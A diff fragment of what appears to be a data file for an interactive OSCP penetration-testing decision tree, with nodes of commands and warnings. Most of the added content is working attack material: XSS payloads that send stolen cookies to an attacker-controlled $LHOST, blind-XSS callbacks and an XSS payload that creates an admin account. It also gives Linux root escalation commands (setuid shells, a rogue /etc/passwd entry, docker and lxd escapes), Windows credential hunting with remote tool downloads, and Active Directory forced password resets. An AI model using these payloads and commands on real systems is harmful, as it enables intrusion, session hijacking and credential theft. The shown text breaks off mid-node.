+#   DOM-based: payload interpreted by client-side JS, never hits server
+
+# ── STEP 2: IDENTIFY COOKIE FLAGS ────────
+# Before stealing cookies — check if they're even stealable
+curl -sv http://$ip/login 2>&1 | grep -i "set-cookie"
+# HttpOnly flag present → JS cannot read document.cookie → pivot to CSRF
+# Secure flag present   → only sent over HTTPS
+# No HttpOnly           → stealable via fetch/XHR
+
+# ── STEP 3: COOKIE THEFT PAYLOAD ─────────
+# Start listener on Kali first:
+nc -nlvp 80
+# Or use python3 for cleaner output:
+python3 -m http.server 80
+
+# Basic cookie exfil (GET request to your server)
+<script>document.location='http://$LHOST/?c='+document.cookie</script>
+
+# Fetch-based (avoids page redirect, stealthier)
+<script>fetch('http://$LHOST/?c='+btoa(document.cookie))</script>
+
+# Image tag (works even in strict HTML contexts)
+<img src=x onerror="this.src='http://$LHOST/?c='+document.cookie">
+
+# XHR (works where fetch is blocked)
+<script>var x=new XMLHttpRequest();x.open('GET','http://$LHOST/?c='+document.cookie);x.send()</script>
+
+# ── STEP 4: SESSION HIJACK ────────────────
+# Take the stolen cookie value and set it in your browser
+# Burp: Proxy → Options → Match/Replace → Add rule:
+#   Replace: Cookie: session=YOUR_SESSION
+#   With:    Cookie: session=STOLEN_COOKIE
+# Or use browser dev tools: Application → Cookies → edit value
+
+# ── STEP 5: STORED XSS — ESCALATE ────────
+# If injection is stored (comments, profile, tickets):
+# Payload fires for EVERY user who visits — including admins
+# Use a payload that auto-exfils on page load:
 <script>
-  fetch('http://$LHOST/?c='+btoa(document.cookie))
+var i=new Image();
+i.src='http://$LHOST/steal?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(document.location);
 </script>
 
-# Listen for cookies
-nc -nlvp 80
+# ── STEP 6: CSP BYPASS ────────────────────
+# Check Content Security Policy before building payload
+curl -sv http://$ip 2>&1 | grep -i "content-security-policy"
 
-# BeEF for advanced exploitation (if available)
-# Hook: <script src="http://$LHOST:3000/hook.js"></script>
+# Common bypass techniques:
+# CSP allows 'self':    use JSONP endpoint on same domain
+# CSP allows CDN:       load malicious script from allowed CDN
+# CSP missing script-src: inline script still works
+# No CSP at all:        any payload works
 
-# CSP bypass check
-curl -sv http://$ip | grep -i "content-security-policy"`,
-    warn: null,
+# ── STEP 7: BLIND XSS (stored, no feedback) ──
+# You inject but can't see the result — admin reviews it later
+# Use a callback payload — XSS Hunter or interactsh catches it
+<script src="https://YOUR.xss.ht"></script>
+# Or host your own:
+<script>fetch('http://$LHOST/blind?h='+encodeURIComponent(document.location)+
+  '&c='+encodeURIComponent(document.cookie)+'&r='+encodeURIComponent(document.referrer))</script>
+
+# ── STEP 8: XSS → CSRF (HttpOnly cookies) ─
+# Can't steal cookie? Use JS to make authenticated requests AS the admin
+# Example: add yourself as admin via XSS-triggered POST request
+<script>
+fetch('/api/admin/adduser', {
+  method: 'POST',
+  headers: {'Content-Type':'application/json'},
+  credentials: 'include',
+  body: JSON.stringify({username:'attacker',password:'pass123',role:'admin'})
+})
+</script>`,
+    warn: "HttpOnly cookies cannot be read by JavaScript — document.cookie will be empty or incomplete. If you see HttpOnly in Set-Cookie headers, pivot from theft to CSRF: use XSS to make authenticated API requests on behalf of the admin. Always check CSP before choosing a payload — a blocked inline script wastes time. Stored XSS in an admin review queue is worth more than reflected XSS you trigger yourself.",
     choices: [
-      { label: "Stole admin cookie — hijacked session", next: "file_upload" },
-      { label: "No interesting cookies — pivot to other vectors", next: "web_fuzz_deep" },
+      { label: "Stole admin cookie — hijack session", next: "login_page" },
+      { label: "Session hijacked — admin panel reached", next: "file_upload" },
+      { label: "HttpOnly cookie — pivot to CSRF via XSS", next: "web_fuzz_deep" },
+      { label: "Blind XSS — waiting for admin callback", next: "web_fuzz_deep" },
+      { label: "XSS → admin panel → file upload", next: "file_upload" },
     ],
   },
 
@@ -4348,19 +4714,58 @@ tmux new -s oscp
   linux_post_exploit: {
     phase: "LINUX",
     title: "Linux — Initial Foothold",
-    body: "Grab local.txt, understand who you are and what you have access to. Orient before you enumerate.",
-    cmd: `id && whoami && hostname
-uname -a && cat /etc/os-release
-cat /etc/passwd   # all users
-ip a              # network position
+    body: "You have a shell. Orient before you enumerate — you need to understand who you are, what you can reach, and whether any quick wins are immediately visible. Run these commands in order: identity → OS → network → users → quick privesc checks. The goal of this phase is to pick the right next step, not to find everything. Stabilize your shell first if you haven't — a dumb shell will fail on sudo and hide password prompts.",
+    cmd: `# ── IDENTITY ─────────────────────────────
+id && whoami
+# uid=0 = already root. uid=33(www-data) = web service, limited.
+# Note your username — it's your pivot for sudo/suid checks
 
-# Grab the flag
-find / -name local.txt 2>/dev/null | xargs cat`,
-    warn: null,
+# ── OS + KERNEL ───────────────────────────
+uname -a                          # kernel version → searchsploit
+cat /etc/os-release               # distro + version
+cat /proc/version
+# Note: kernel < 4.4 → DirtyC0w candidates
+
+# ── NETWORK POSITION ──────────────────────
+ip a                              # all interfaces — look for eth1/ens33 (internal)
+ip route                          # routing table — other subnets?
+cat /etc/hosts                    # static hostname mappings
+ss -tulpn                         # listening services (may reveal local-only targets)
+# If you see 127.0.0.1:PORT → service only reachable locally — port forward it
+
+# ── USERS ────────────────────────────────
+cat /etc/passwd | grep -v nologin | grep -v false   # interactive users
+cat /etc/group                    # group memberships — look for docker,lxd,sudo,disk,adm
+ls /home/                         # whose home dirs exist?
+ls -la /home/*/                   # what's in them?
+
+# ── GRAB THE FLAG ─────────────────────────
+find / -name "local.txt" -o -name "proof.txt" 2>/dev/null | xargs cat 2>/dev/null
+
+# ── QUICK WINS — CHECK BEFORE RUNNING LINPEAS ──
+sudo -l                           # sudo rights — if anything here go straight to sudo_check
+find / -perm -u=s -type f 2>/dev/null   # SUID binaries — run through GTFOBins
+cat ~/.bash_history               # previous commands — often contains creds
+env                               # environment variables — API keys, passwords
+ls -la /opt /srv /var/backups /var/www 2>/dev/null   # non-standard dirs
+
+# ── WRITEABLE DIRECTORIES ─────────────────
+find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -20
+# /tmp /dev/shm = always writable — use for tool drops
+# /var/www/html = webroot writable → drop webshell
+# /etc = writable → game over (add user to /etc/passwd)
+
+# ── ACTIVE PROCESSES ──────────────────────
+ps aux                            # running processes — what is root running?
+ps aux | grep root                # root-owned processes specifically
+# Look for: cron scripts, custom daemons, web apps, backup scripts`,
+    warn: "Check sudo -l and SUID before running LinPEAS — a sudo misconfiguration or GTFOBins SUID binary can give root in 30 seconds. LinPEAS takes 3-5 minutes and produces a wall of output; quick manual checks first means you don't waste time if the win is trivial. If ip route shows a second subnet, note it immediately — that's your pivot path and you need it before you lose context.",
     choices: [
-      { label: "New subnet visible in ip route — pivot!", next: "pivot_start" },
-      { label: "Run LinPEAS (automated, thorough)", next: "linpeas" },
-      { label: "sudo -l first (quickest win)", next: "sudo_check" },
+      { label: "sudo -l shows rights — escalate now", next: "sudo_check" },
+      { label: "SUID binary found — GTFOBins", next: "suid_check" },
+      { label: "New subnet in ip route — pivot", next: "pivot_start" },
+      { label: "Run LinPEAS (automated)", next: "linpeas" },
+      { label: "Internal port in ss -tulpn — port forward", next: "pivot_start" },
     ],
   },
 
@@ -4481,28 +4886,93 @@ export PATH=/tmp:$PATH`,
 
   linux_manual_enum: {
     phase: "LINUX",
-    title: "Deep Manual Enumeration",
-    body: "LinPEAS missed something. Go manual on capabilities, NFS, writable files, interesting env vars, stored creds in configs.",
-    cmd: `getcap -r / 2>/dev/null
-# python3 cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+    title: "Linux — Deep Manual Enumeration",
+    body: "LinPEAS ran and nothing obvious came up. Go deeper manually — each category below catches things automated tools miss or misread. Work through them in order: capabilities and writable files are the fastest wins, then NFS, then process analysis with pspy, then /etc/passwd writability. The goal is to understand the full attack surface, not just run commands.",
+    cmd: `# ── LINUX CAPABILITIES ────────────────────
+getcap -r / 2>/dev/null
+# High-value capabilities:
+# cap_setuid     → setuid(0) → root shell
+# cap_net_raw    → packet capture → may sniff creds
+# cap_dac_read_search → read any file (bypass permissions)
+# cap_sys_admin  → mount namespaces, many privesc paths
 
-cat /etc/exports && showmount -e $ip
+# cap_setuid exploit (python3, perl, ruby, etc.):
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
 
+# cap_dac_read_search (tar, xxd):
+# xxd /etc/shadow | xxd -r   # read shadow file
+# tar -cvf /dev/null /etc/shadow 2>&1 | head   # may leak contents
+
+# ── NFS NO_ROOT_SQUASH ────────────────────
+cat /etc/exports
+showmount -e $ip
+# Look for: no_root_squash
+# If present → mount the share from Kali as root → create SUID binary
+
+# On Kali (as root):
+# mount -t nfs $ip:/shared /mnt/nfs -o nolock
+# cp /bin/bash /mnt/nfs/rootbash
+# chmod +s /mnt/nfs/rootbash
+# On target: /shared/rootbash -p   → root shell
+
+# ── WRITABLE /ETC/PASSWD ──────────────────
 ls -la /etc/passwd
-openssl passwd -1 -salt x pass123
-echo 'r00t:$1$x$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
+# If writable → add a root user:
+openssl passwd -1 -salt x pass123    # generates: $1$x$HASH
+echo 'r00t:HASHHERE:0:0::/root:/bin/bash' >> /etc/passwd
+su r00t   # password: pass123
 
-find / -name "id_rsa" 2>/dev/null
-cat ~/.bash_history
-find / -name "*.conf" | xargs grep -i "password" 2>/dev/null
-find / -mmin -10 -type f 2>/dev/null`,
-    warn: null,
+# Alternatively — if you can write any file root reads (cron, service):
+# echo 'chmod +s /bin/bash' >> /path/writable/root/runs
+
+# ── PSPY — PROCESS MONITORING ─────────────
+# Catches cron jobs and scheduled processes that don't appear in crontab
+wget http://$LHOST/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy
+/tmp/pspy
+# Watch for: UID=0 processes, scripts run from writable paths
+
+# ── WRITABLE FILES OWNED BY ROOT ─────────
+# Files root owns that you can write = cron job path, service script
+find / -writable -not -path "/proc/*" -not -path "/sys/*" \\
+  -not -path "/dev/*" -type f 2>/dev/null
+# Filter to interesting ones:
+find / -writable -not -path "/proc/*" -not -path "/sys/*" \\
+  -type f 2>/dev/null | grep -vE "^/tmp|^/dev/shm" | head -30
+
+# ── RECENTLY MODIFIED FILES ───────────────
+find / -mmin -15 -type f -not -path "/proc/*" 2>/dev/null
+# Anything changed recently while you were on the box = active process
+
+# ── GROUP MEMBERSHIP PRIVESC ──────────────
+id    # look for: docker, lxd, disk, adm, shadow, sudo
+# docker group:
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# lxd group:
+lxc image import alpine.tar.gz --alias alpine
+lxc init alpine privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc && lxc exec privesc /bin/sh
+# disk group:
+debugfs /dev/sda1
+debugfs:  cat /etc/shadow
+# adm group: read /var/log/auth.log, /var/log/syslog (may contain passwords)
+
+# ── INTERNAL NETWORK SERVICES ─────────────
+ss -tulpn
+netstat -tulpn 2>/dev/null
+# Services on 127.0.0.1 not in original nmap:
+# Set up port forward to access from Kali:
+ssh -R 8080:127.0.0.1:8080 kali@$LHOST -N   # if you have SSH out`,
+    warn: "pspy is often the key to finding cron jobs that don't show up in crontab — run it for at least 2-3 minutes and watch for UID=0 processes. The docker group is an instant root regardless of any other hardening. Writable /etc/passwd is rare but still appears on OSCP boxes — always check permissions with ls -la /etc/passwd. Recently modified files (find -mmin -15) reveal what the system is actively doing and often point directly to the privesc vector.",
     choices: [
-      { label: "Capabilities exploit worked — ROOT!", next: "got_root_linux" },
-      { label: "NFS no_root_squash — SUID exploit", next: "got_root_linux" },
+      { label: "Capabilities exploit — root via setuid", next: "got_root_linux" },
+      { label: "NFS no_root_squash — SUID via mount", next: "got_root_linux" },
       { label: "Writable /etc/passwd — added root user", next: "got_root_linux" },
-      { label: "Group membership (docker/lxd/disk)", next: "linux_privesc_extra" },
-      { label: "Still nothing — kernel exploit", next: "kernel_exploit" },
+      { label: "Docker/LXD group — container escape", next: "linux_privesc_extra" },
+      { label: "pspy found writable cron script", next: "cron_check" },
+      { label: "Internal port — port forward and attack", next: "pivot_start" },
+      { label: "Nothing — kernel exploit last resort", next: "kernel_exploit" },
     ],
   },
 
@@ -4559,49 +5029,156 @@ cat /root/proof.txt
   windows_post_exploit: {
     phase: "WINDOWS",
     title: "Windows — Initial Foothold",
-    body: "Orient immediately. Who are you, what privileges do you have, what's the network look like. Token privileges are your first PrivEsc signal.",
-    cmd: `whoami
-whoami /all
-whoami /priv
-hostname
-systeminfo
-ipconfig /all
+    body: "You have a Windows shell. Orient before automating — who you are and what privileges you have determines everything. Token privileges are your fastest win: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is instant SYSTEM via potato. Integrity level tells you whether UAC is in the way. Network position tells you if there are subnets to pivot into. Do this manual triage first — it takes 60 seconds and may save you 30 minutes of WinPEAS output.",
+    cmd: `# ── IDENTITY + INTEGRITY ─────────────────
+whoami
+whoami /all        # everything: username, groups, privileges, token integrity
+# Integrity levels:
+#   Low       = restricted process (browser sandbox) — very limited
+#   Medium    = standard user — most OSCP starting points
+#   High      = admin with UAC elevation — already powerful
+#   System    = NT AUTHORITY\SYSTEM — game over
 
-# Grab flag
-type C:\\Users\\%username%\\Desktop\\local.txt
-Get-ChildItem -Path "C:\\Users\\*" -Include "local.txt" -Recurse -EA SilentlyContinue | Get-Content`,
-    warn: null,
+# ── TOKEN PRIVILEGES — CHECK FIRST ────────
+whoami /priv
+# Instant SYSTEM if present:
+#   SeImpersonatePrivilege        → Potato attack
+#   SeAssignPrimaryTokenPrivilege → Potato attack
+#   SeBackupPrivilege             → read any file (SAM/SYSTEM dump)
+#   SeRestorePrivilege            → write any file
+#   SeTakeOwnershipPrivilege      → take ownership of any object
+#   SeDebugPrivilege              → attach to LSASS → mimikatz
+#   SeLoadDriverPrivilege         → load malicious driver
+
+# ── OS + PATCH LEVEL ──────────────────────
+systeminfo
+systeminfo | findstr /i "os name\|os version\|hotfix"
+wmic qfe get Caption,Description,HotFixID,InstalledOn   # installed patches
+
+# ── NETWORK POSITION ──────────────────────
+ipconfig /all                  # all interfaces — look for second NIC
+route print                    # routing table — other subnets?
+arp -a                         # ARP cache — other hosts
+netstat -ano                   # all connections — internal services on 127.0.0.1
+# Note: 127.0.0.1:PORT = local-only service nmap never saw → port forward it
+
+# ── GROUP MEMBERSHIPS ─────────────────────
+net user %USERNAME%
+net localgroup administrators  # am I local admin?
+# Local admin + medium integrity = UAC bypass needed
+# Local admin + high integrity = already elevated
+
+# ── GRAB THE FLAG ─────────────────────────
+type C:\Users\%USERNAME%\Desktop\local.txt 2>nul
+Get-ChildItem -Path "C:\Users" -Include "local.txt","proof.txt" \\
+  -Recurse -EA SilentlyContinue | Get-Content
+
+# ── AV / DEFENDER CHECK ───────────────────
+sc query windefend            # Windows Defender running?
+Get-MpComputerStatus          # Defender status (PowerShell)
+# If Defender is running and blocking tools — amsi_bypass first
+
+# ── QUICK WINS BEFORE WINPEAS ─────────────
+# Check these manually — they're faster than waiting for WinPEAS
+
+# AlwaysInstallElevated (both keys = instant SYSTEM via MSI)
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
+
+# Stored credentials
+cmdkey /list                  # saved credentials manager entries
+
+# Scheduled tasks (non-Microsoft)
+schtasks /query /fo LIST /v | findstr /i "task name\|run as user\|task to run" | findstr /v "N/A\|system32"
+
+# Unquoted service paths (quick check)
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v '"'`,
+    warn: "Read whoami /priv BEFORE running WinPEAS. SeImpersonatePrivilege = GodPotato in 30 seconds. If you see it, stop and exploit immediately — no need to wait for WinPEAS. Medium integrity with local admin group = UAC bypass needed. High integrity = already elevated, skip UAC. netstat -ano is critical — local-only services on 127.0.0.1 that nmap missed are often the actual privesc vector.",
     choices: [
-      { label: "New subnet in ipconfig/route print — pivot!", next: "pivot_start" },
-      { label: "Run WinPEAS (automated)", next: "winpeas" },
-      { label: "Check token privs first (whoami /priv)", next: "token_privs" },
-      { label: "PowerShell tools blocked — AMSI bypass first", next: "amsi_bypass" },
+      { label: "SeImpersonatePrivilege — Potato now", next: "token_privs" },
+      { label: "AlwaysInstallElevated set — MSI payload", next: "always_install_elevated" },
+      { label: "Local admin + medium integrity — UAC bypass", next: "win_uac_bypass" },
+      { label: "New subnet in route print — pivot", next: "pivot_start" },
+      { label: "Defender blocking — AMSI bypass first", next: "amsi_bypass" },
+      { label: "Run WinPEAS (full automated)", next: "winpeas" },
     ],
   },
 
   winpeas: {
     phase: "WINDOWS",
-    title: "WinPEAS",
-    body: "Transfer and run. Read RED findings first. Key areas: token privs, service vulns, stored creds, AlwaysInstallElevated, unquoted paths.",
-    cmd: `# Transfer (python3 -m http.server 80 on attacker)
-iwr http://$LHOST/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
-.\\wp.exe
+    title: "WinPEAS — Automated Windows Enumeration",
+    body: "WinPEAS is thorough but produces overwhelming output. The skill is triage: read RED first, then YELLOW. Most people run it, get wall-of-text, and miss the actual finding. Know the five categories that produce actionable OSCP results and grep for them directly. Run PowerUp alongside WinPEAS — they catch different things. Tee output to a file so you can re-grep later.",
+    cmd: `# ── TRANSFER WINPEAS ─────────────────────
+# Kali: python3 -m http.server 80
+# Windows (PowerShell):
+iwr http://$LHOST/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
+# Windows (cmd.exe):
+certutil -urlcache -split -f http://$LHOST/winPEASx64.exe C:\Windows\Temp\wp.exe
+# Via SMB (if HTTP blocked):
+# Kali: impacket-smbserver share . -smb2support
+copy \\$LHOST\share\winPEASx64.exe C:\Windows\Temp\wp.exe
 
-# Also run PowerUp
-iwr http://$LHOST/PowerUp.ps1 -OutFile C:\\Windows\\Temp\\pu.ps1
-. .\\pu.ps1
-Invoke-AllChecks
+# ── RUN AND CAPTURE ───────────────────────
+C:\Windows\Temp\wp.exe | Out-File C:\Windows\Temp\wp_out.txt
+# Or ansi output (color stripped — easier to read):
+C:\Windows\Temp\wp.exe -ansi | Out-File C:\Windows\Temp\wp_ansi.txt
 
-# Seatbelt for targeted checks
-.\\Seatbelt.exe -group=all`,
-    warn: null,
+# ── TRIAGE: READ IN THIS ORDER ────────────
+# 1. TOKEN PRIVILEGES (fastest win)
+#    Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
+#    → GodPotato / PrintSpoofer → instant SYSTEM
+
+# 2. ALWAYSINSTALLELEVATED
+#    Both registry keys = 0x1 → MSI payload → SYSTEM
+
+# 3. SERVICE VULNERABILITIES
+#    Unquoted path + writable prefix directory
+#    Weak service permissions (you can modify binary path)
+#    Writable service binary
+
+# 4. STORED CREDENTIALS
+#    cmdkey entries, SAM/SYSTEM accessible, registry passwords
+#    Browser saved passwords, Credential Manager
+
+# 5. SCHEDULED TASKS
+#    Non-Microsoft tasks running as SYSTEM with writable scripts
+
+# ── POWERUP — COMPLEMENTARY TOOL ─────────
+iwr http://$LHOST/PowerUp.ps1 -OutFile C:\Windows\Temp\pu.ps1
+. C:\Windows\Temp\pu.ps1
+Invoke-AllChecks | Out-File C:\Windows\Temp\pu_out.txt
+
+# PowerUp catches specifically:
+#   Invoke-ServiceAbuse (weak perms)
+#   Write-ServiceBinary (binary replacement)
+#   Find-PathDLLHijack (DLL hijack)
+#   Get-UnquotedService (unquoted paths)
+#   Get-RegAlwaysInstallElevated
+
+# ── GREP THE OUTPUT FOR KEY VECTORS ───────
+# On Windows (PowerShell):
+Select-String -Path C:\Windows\Temp\wp_out.txt -Pattern "SeImpersonate|Impersonat"
+Select-String -Path C:\Windows\Temp\wp_out.txt -Pattern "AlwaysInstall"
+Select-String -Path C:\Windows\Temp\wp_out.txt -Pattern "Unquoted"
+Select-String -Path C:\Windows\Temp\wp_out.txt -Pattern "No quotes and Space"
+Select-String -Path C:\Windows\Temp\wp_out.txt -Pattern "password|Password|PASSWORD"
+
+# ── SEATBELT — TARGETED CHECKS ────────────
+iwr http://$LHOST/Seatbelt.exe -OutFile C:\Windows\Temp\sb.exe
+# Run all checks:
+C:\Windows\Temp\sb.exe -group=all
+# Targeted — just credentials:
+C:\Windows\Temp\sb.exe CredEnum WindowsCredentialFiles DpapiMasterKeys
+# Targeted — system:
+C:\Windows\Temp\sb.exe TokenGroups TokenPrivileges UAC`,
+    warn: "WinPEAS with Defender running will often get caught and deleted. Run Defender check first (sc query windefend). If Defender is active: use AMSI bypass first, or use PowerUp (less detected) instead. Tee WinPEAS output to a file — you will want to re-grep it after finding a vector. Don't act on every RED finding: some are informational. The five categories above are the only ones that reliably produce OSCP wins.",
     choices: [
-      { label: "SeImpersonatePrivilege found", next: "token_privs" },
-      { label: "Unquoted service path found", next: "unquoted_service" },
-      { label: "AlwaysInstallElevated found", next: "always_install_elevated" },
+      { label: "SeImpersonatePrivilege — Potato attack", next: "token_privs" },
+      { label: "AlwaysInstallElevated — MSI payload", next: "always_install_elevated" },
+      { label: "Unquoted service path", next: "unquoted_service" },
       { label: "Weak service permissions", next: "weak_service" },
-      { label: "Stored creds / SAM", next: "windows_creds" },
-      { label: "Nothing clear — scheduled tasks / manual", next: "windows_manual_enum" },
+      { label: "Stored credentials found", next: "windows_creds" },
+      { label: "Nothing clear — go manual", next: "windows_manual_enum" },
     ],
   },
 
@@ -4774,43 +5351,110 @@ crackmapexec winrm $ip -u administrator -H <NTLM_HASH>`,
 
   windows_manual_enum: {
     phase: "WINDOWS",
-    title: "Windows Manual Enumeration",
-    body: "WinPEAS missed something — or you need to understand what it found. Methodical manual enumeration across every category. Check each before concluding nothing is there.",
-    cmd: `# ── SYSTEM BASELINE ──────────────────────
-systeminfo
-whoami /all          # privs, groups, token integrity level
-net user %USERNAME%
-net localgroup administrators
+    title: "Windows — Deep Manual Enumeration",
+    body: "WinPEAS ran and nothing actionable surfaced — or you need to understand what it found before exploiting. Manual enumeration covers every attack surface category. Work through them in order: services and tasks are the most common OSCP vectors, then credential hunting, then network internals. Each category has a specific question: can I write this file? Can I control this service? Is this port reachable internally?",
+    cmd: `# ── SERVICES — MOST COMMON OSCP VECTOR ───
+# Non-Windows services with full paths
+wmic service get name,displayname,startmode,pathname \\
+  | findstr /i /v "C:\Windows\\"
 
-# ── SERVICES ─────────────────────────────
-wmic service get name,displayname,startmode,pathname | findstr /v "C:\\Windows"
-Get-WmiObject win32_service | where {$_.PathName -notlike "*Windows*"} | select Name,PathName,StartMode
+# Unquoted service paths (look for spaces without quotes)
+wmic service get name,pathname \\
+  | findstr /i /v "C:\Windows\\" | findstr /i /v '"'
+# Vulnerable: C:\Program Files\Vuln App\service.exe  (no quotes, has spaces)
 
-# ── SCHEDULED TASKS ──────────────────────
-schtasks /query /fo LIST /v | findstr /i "task\|run\|next\|status\|as user"
-Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | Select TaskName,Actions
+# Weak service permissions — can you modify it?
+# Download accesschk or use sc
+sc sdshow <ServiceName>   # read the SDDL permissions
+# Or: accesschk.exe /accepteula -wuvc <ServiceName>
 
-# ── INSTALLED SOFTWARE ────────────────────
-wmic product get name,version
-Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion
+# Writable service binaries
+for /f "tokens=2 delims='='" %s in ('wmic service list full^|find /i "pathname"^|find /i /v "svchost"') do (
+  icacls "%s" 2>nul | findstr /i "Everyone\|BUILTIN\\Users\|Authenticated Users" | findstr "F\|M\|W"
+)
+
+# ── SCHEDULED TASKS ───────────────────────
+# All non-Microsoft tasks
+schtasks /query /fo LIST /v \\
+  | findstr /i "Task Name:\|Run As User:\|Task To Run:" \\
+  | findstr /v "N/A\|\Microsoft"
+
+# PowerShell — get tasks with their run paths:
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} \\
+  | Select-Object TaskName,@{N='Action';E={$_.Actions.Execute}},@{N='RunAs';E={$_.Principal.UserId}}
+
+# For each interesting task:
+schtasks /query /fo LIST /v /tn "TaskName"
+# Key fields: Run As User (privilege gained), Task To Run (can you write it?)
+icacls "C:\path\to\task\binary.exe"   # check write permissions
+
+# ── INSTALLED SOFTWARE — VERSION HUNTING ──
+wmic product get name,version | findstr /v "^$"
+Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* \\
+  | Select DisplayName,DisplayVersion | Sort DisplayName
+
+# Search for CVEs on installed apps:
+# searchsploit <product> <version>
 
 # ── REGISTRY AUTORUNS ─────────────────────
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+# Can you write to the binary referenced?
+# icacls "C:\path\to\autorun.exe"
 
 # ── NETWORK INTERNALS ─────────────────────
 netstat -ano
-# Internal ports not in nmap = local-only services
-# Exploitable via port forward
-route print    # other subnets?
-arp -a         # other hosts seen?`,
-    warn: "netstat -ano reveals services listening on 127.0.0.1 that nmap never saw. These are local-only services — pivot to them via port forward. Common finds: internal web panels, DB services, dev servers.",
+# Services on 127.0.0.1 that nmap never saw:
+netstat -ano | findstr "127.0.0.1\|LISTENING"
+# Map PID to process:
+tasklist /fi "pid eq <PID>"
+# Port forward to access from Kali:
+# chisel client $LHOST:8080 R:LOCAL_PORT:127.0.0.1:INTERNAL_PORT
+
+route print        # other subnets → pivot path
+arp -a             # other hosts this machine has talked to
+
+# ── CREDENTIAL HUNTING ────────────────────
+# Saved credentials in Credential Manager
+cmdkey /list
+# Run as saved user:
+runas /savecred /user:DOMAIN\admin "cmd /c whoami > C:\Windows\Temp\out.txt"
+
+# Registry password hunt
+reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password"
+reg query HKCU /f password /t REG_SZ /s 2>nul | findstr /i "password"
+
+# Unattend.xml / Sysprep (leftover deployment creds — plaintext or base64)
+dir /s /b C:\Windows\Panther\Unattend*.xml 2>nul
+dir /s /b C:\Windows\System32\Sysprep\*.xml 2>nul
+# If found: grep for <Password> or <AdministratorPassword>
+
+# Config files with passwords
+dir /s /b C:\\inetpub\\*.config 2>nul
+dir /s /b C:\\xampp\\*.ini 2>nul
+findstr /si "password" C:\\inetpub\\wwwroot\\*.config 2>nul
+findstr /si "password" C:\\*.xml C:\\*.ini C:\\*.txt 2>nul
+
+# PowerShell history
+type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# Contains every PS command run — often has credentials
+
+# ── DLL HIJACK HUNTING ────────────────────
+# Services that load DLLs from writable directories
+# Check known DLL hijack targets (Process Monitor is ideal with RDP)
+# Without Procmon: check common patterns
+Get-WmiObject win32_service | where {$_.State -eq "Running"} \\
+  | select Name,PathName | foreach { icacls (Split-Path $_.PathName) 2>nul \\
+  | findstr /i "Everyone\|Users.*M\|Users.*W\|Users.*F" }`,
+    warn: "PowerShell history (ConsoleHost_history.txt) is one of the highest-yield credential sources on Windows — admins frequently type passwords in PS commands and forget. Unattend.xml leftover from OS deployment contains the Administrator password in base64 or cleartext and is present on a surprising number of OSCP machines. netstat -ano 127.0.0.1 ports are your second attack surface — treat them as a separate machine accessible via port forward.",
     choices: [
-      { label: "Suspicious scheduled task", next: "win_schtask" },
-      { label: "DLL hijack opportunity", next: "win_dll_hijack" },
-      { label: "UAC blocking — need to bypass", next: "win_uac_bypass" },
-      { label: "Internal listening port", next: "pivot_start" },
-      { label: "Nothing — check stored credentials", next: "windows_creds" },
+      { label: "Suspicious scheduled task — writable binary", next: "win_schtask" },
+      { label: "DLL hijack opportunity found", next: "win_dll_hijack" },
+      { label: "UAC is the blocker — bypass it", next: "win_uac_bypass" },
+      { label: "Internal port — port forward and attack", next: "pivot_start" },
+      { label: "Credentials found in registry/files", next: "creds_found" },
+      { label: "Nothing — credential hunting next", next: "windows_creds" },
     ],
   },
 
@@ -5266,118 +5910,325 @@ crackmapexec smb $ip -u users.txt -p 'Winter2024!' --continue-on-success
 
   acl_abuse: {
     phase: "AD",
-    title: "ACL Abuse",
-    body: "BloodHound showed you a misconfigured ACL. GenericAll, GenericWrite, WriteDACL, ForceChangePassword — all paths to escalation.",
-    cmd: `# GenericAll over user — force password reset
-Set-DomainUserPassword -Identity targetuser \\
-  -AccountPassword (ConvertTo-SecureString 'Hack3d!23' -AsPlainText -Force)
+    title: "ACL Abuse — Misconfigured Permissions",
+    body: "BloodHound found an ACL edge. Each edge type has a specific exploitation method — don't mix them up. The key questions are: what object do you have rights over (user, group, computer, domain), and what right do you have (GenericAll, GenericWrite, WriteDACL, ForceChangePassword, WriteOwner). Read the BloodHound edge tooltip before acting — it tells you exactly what the edge allows. PowerView is your tool for all of these from a Windows foothold.",
+    cmd: `# ── SETUP: POWERVIEW ─────────────────────
+# Load PowerView (after AMSI bypass if needed):
+iwr http://$LHOST/PowerView.ps1 -OutFile C:\Windows\Temp\pv.ps1
+. C:\Windows\Temp\pv.ps1
+# Or from Kali via evil-winrm: upload PowerView.ps1
 
-# GenericAll over group — add yourself
-Add-DomainGroupMember -Identity 'Domain Admins' -Members 'youruser'
+# ── GENERICALL OVER A USER ────────────────
+# Full control — force password reset (no knowledge of old password needed)
+$pass = ConvertTo-SecureString 'Pwn3d!123' -AsPlainText -Force
+Set-DomainUserPassword -Identity targetuser -AccountPassword $pass
+# Then authenticate as targetuser:
+evil-winrm -i $ip -u targetuser -p 'Pwn3d!123'
 
-# WriteDACL — grant yourself DCSync
